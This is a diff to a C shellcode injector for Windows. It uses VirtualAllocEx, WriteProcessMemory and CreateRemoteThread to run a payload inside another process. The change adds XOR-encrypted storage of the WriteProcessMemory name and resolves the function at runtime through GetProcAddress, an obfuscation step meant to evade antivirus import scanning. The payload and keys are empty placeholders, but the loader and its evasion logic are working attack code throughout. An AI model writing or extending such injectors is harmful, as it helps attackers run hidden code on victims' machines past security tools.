@@ -14,12 +14,14 @@ unsigned char my_payload[] = { };
 unsigned char s_vaex[] = { };
 unsigned char s_cth[] = { };
 unsigned char s_wfso[] = { };
+unsigned char s_wpm[] = { };
 
 // length
 unsigned int my_payload_len = sizeof(my_payload);
 unsigned int s_vaex_len = sizeof(s_vaex);
 unsigned int s_cth_len = sizeof(s_cth);
 unsigned int s_wfso_len = sizeof(s_wfso);
+unsigned int s_wpm_len = sizeof(s_wpm);
 
 char my_payload_key[] = "";
 char f_key[] = "";
@@ -35,6 +37,13 @@ HANDLE (WINAPI * pCreateRemoteThread)(
   LPDWORD                lpThreadId
 );
 DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+BOOL (WINAPI * pWriteProcessMemory)(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -87,7 +96,10 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vaex);
         pRemoteCode = pVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 
-        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+        // decrypt WriteProcessMemory function call
+        XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
+        pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wpm);        
+        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
         
         // decrypt CreateRemoteThread function call
         XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
